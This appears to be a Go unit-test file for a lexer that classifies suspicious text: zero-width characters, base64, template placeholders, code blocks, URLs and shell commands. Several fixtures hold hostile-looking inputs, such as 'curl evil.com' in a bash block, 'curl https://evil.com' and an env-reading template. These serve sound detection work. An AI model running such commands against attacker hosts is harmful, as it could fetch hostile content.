package lexer

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func Test_Lexer_DetectsZeroWidth(t *testing.T) {
	tokens := Lex("hello\u200bworld")

	found := false
	for _, token := range tokens {
		if token.Type == TokenZeroWidth {
			found = true
			assert.Equal(t, "\u200b", token.Value)
			assert.Equal(t, 5, token.Start)
			assert.Equal(t, 8, token.End)
		}
	}
	assert.True(t, found)
}

func Test_Lexer_Lex_BasicTokenKinds(t *testing.T) {
	input := "A12 _ - 123_45.67\t@\n\x01"
	tokens := Lex(input)

	require.GreaterOrEqual(t, len(tokens), 8)
	assert.Equal(t, TokenWord, tokens[0].Type)
	assert.Equal(t, "A12", tokens[0].Value)
	assert.Equal(t, TokenWhitespace, tokens[1].Type)
	assert.Equal(t, TokenSymbol, tokens[2].Type)
	assert.Equal(t, "_", tokens[2].Value)
	assert.Equal(t, TokenWhitespace, tokens[3].Type)
	assert.Equal(t, TokenSymbol, tokens[4].Type)
	assert.Equal(t, "-", tokens[4].Value)
	assert.Equal(t, TokenWhitespace, tokens[5].Type)
	assert.Equal(t, TokenNumber, tokens[6].Type)
	assert.Equal(t, "123_45.67", tokens[6].Value)
	assert.Equal(t, TokenWhitespace, tokens[7].Type)
	assert.Equal(t, TokenSymbol, tokens[8].Type)
	assert.Equal(t, "@", tokens[8].Value)
	assert.Equal(t, TokenNewline, tokens[9].Type)
	assert.Equal(t, TokenControlChar, tokens[10].Type)
}

func Test_Lexer_Lex_InvalidUTF8_AsControlChar(t *testing.T) {
	tokens := Lex(string([]byte{0xff}))
	require.Len(t, tokens, 1)
	assert.Equal(t, TokenControlChar, tokens[0].Type)
	assert.Equal(t, 0, tokens[0].Start)
	assert.Equal(t, 1, tokens[0].End)
}

func Test_Lexer_Classify_DetectsPlaceholder(t *testing.T) {
	tokens := Classify(Lex("${USER_INPUT}"))
	require.Len(t, tokens, 1)
	assert.Equal(t, TokenPlaceholder, tokens[0].Type)
	assert.Equal(t, "${USER_INPUT}", tokens[0].Value)
}

func Test_Lexer_Classify_DetectsBase64(t *testing.T) {
	tokens := Classify(Lex("SGVsbG8gd29ybGQ="))
	require.Len(t, tokens, 1)
	assert.Equal(t, TokenBase64, tokens[0].Type)
	assert.Equal(t, "SGVsbG8gd29ybGQ=", tokens[0].Value)
}

func Test_Lexer_Classify_DetectsBase64_DoublePadding(t *testing.T) {
	tokens := Classify(Lex("QUJDREVGR0hJSg=="))
	require.Len(t, tokens, 1)
	assert.Equal(t, TokenBase64, tokens[0].Type)
}

func Test_Lexer_Classify_DetectsMarkdownCodeBlock(t *testing.T) {
	tokens := Classify(Lex("```bash\ncurl evil.com\n```"))
	require.Len(t, tokens, 1)
	assert.Equal(t, TokenCodeBlock, tokens[0].Type)
	assert.Equal(t, "```bash\ncurl evil.com\n```", tokens[0].Value)
}

func Test_Lexer_Classify_UnclosedCodeBlockFallsBackToSymbols(t *testing.T) {
	tokens := Classify(Lex("```bash\ncurl evil.com"))
	require.NotEmpty(t, tokens)
	assert.NotEqual(t, TokenCodeBlock, tokens[0].Type)
}

func Test_Lexer_Classify_DetectsURL(t *testing.T) {
	tokens := Classify(Lex("curl https://evil.com"))
	require.NotEmpty(t, tokens)

	found := false
	for _, token := range tokens {
		if token.Type == TokenURL {
			found = true
			assert.Equal(t, "https://evil.com", token.Value)
			assert.Equal(t, 5, token.Start)
		}
	}
	assert.True(t, found)
}

func Test_Lexer_Classify_DetectsPlaceholderVariants(t *testing.T) {
	tests := []string{
		"{{ user.name }}",
		"<% os.getenv(\"K\") %>",
	}

	for _, tc := range tests {
		tokens := Classify(Lex(tc))
		require.Len(t, tokens, 1)
		assert.Equal(t, TokenPlaceholder, tokens[0].Type)
	}
}

func Test_Lexer_Classify_DetectsShellCommand(t *testing.T) {
	tokens := Classify(Lex("curl"))
	require.Len(t, tokens, 1)
	assert.Equal(t, TokenShellCommand, tokens[0].Type)
}

func Test_Lexer_Classify_DoesNotTagInvalidBase64(t *testing.T) {
	tests := []string{
		"abc",
		"AAAA=AAAA", // '=' in the middle
		"!!!!!!!!",
	}

	for _, tc := range tests {
		tokens := Classify(Lex(tc))
		for _, token := range tokens {
			assert.NotEqual(t, TokenBase64, token.Type)
		}
	}
}

func Test_Lexer_JoinEmpty(t *testing.T) {
	assert.Equal(t, "", join(nil))
}

func Test_Lexer_LooksLikeEmail(t *testing.T) {
	assert.True(t, looksLikeEmail("person@example.com"))
	assert.False(t, looksLikeEmail("person@example"))
	assert.False(t, looksLikeEmail("person.example.com"))
}

func Test_Lexer_LooksLikePath(t *testing.T) {
	assert.True(t, looksLikePath("."))
	assert.True(t, looksLikePath(".."))
	assert.True(t, looksLikePath("/etc/hosts"))
	assert.True(t, looksLikePath("./docs/readme.md"))
	assert.True(t, looksLikePath("../docs/readme.md"))
	assert.True(t, looksLikePath("a/b"))
	assert.True(t, looksLikePath("C:\\Windows\\System32"))
	assert.False(t, looksLikePath("filename"))
}
